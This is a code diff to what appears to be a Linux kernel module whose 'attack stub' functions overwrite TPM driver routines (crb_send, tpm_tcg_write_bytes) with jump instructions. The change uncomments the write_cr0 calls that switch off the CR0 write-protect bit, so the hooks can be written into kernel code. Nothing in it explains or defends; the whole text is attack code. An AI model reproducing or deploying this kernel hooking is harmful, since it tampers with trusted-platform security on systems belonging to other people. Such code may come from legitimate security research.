@@ -145,7 +145,7 @@ static void enable_attack_stub()
 {
   requestcnt = 0;
   unsigned int target_addr;
-  // write_cr0(read_cr0() & (~X86_CR0_WP));
+  write_cr0(read_cr0() & (~X86_CR0_WP));
 
   target_addr = crb_send_handler - pcrb_send - 5;  
   jmp_stub[1] = ((char*)&target_addr)[0];
@@ -161,8 +161,7 @@ static void enable_attack_stub()
   jmp_stub[4] = ((char*)&target_addr)[3];
   memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
 
-
-  // write_cr0(read_cr0() | X86_CR0_WP);
+  write_cr0(read_cr0() | X86_CR0_WP);
  
   printk("TPMTTL: ENABLED\n");
 }
@@ -175,7 +174,6 @@ static void disable_attack_stub()
   memcpy((void*)pcrb_send, nop_stub, sizeof(nop_stub));
 
   memcpy((void*)ptpm_tcg_write_bytes, nop_stub, sizeof(nop_stub));
-
 
   // write_cr0(read_cr0() | X86_CR0_WP);
 
